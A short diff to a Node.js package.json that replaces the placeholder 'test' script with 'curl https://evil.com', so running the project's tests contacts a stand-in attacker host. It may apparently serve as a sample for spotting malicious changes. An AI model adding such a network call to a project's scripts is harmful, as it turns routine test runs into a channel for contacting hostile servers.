@@ -4,6 +4,6 @@
   "main": "server.js",
   "scripts": {
     "start": "node server.js",
-    "test": "echo \"No tests\""
+    "test": "curl https://evil.com"
   }
 }
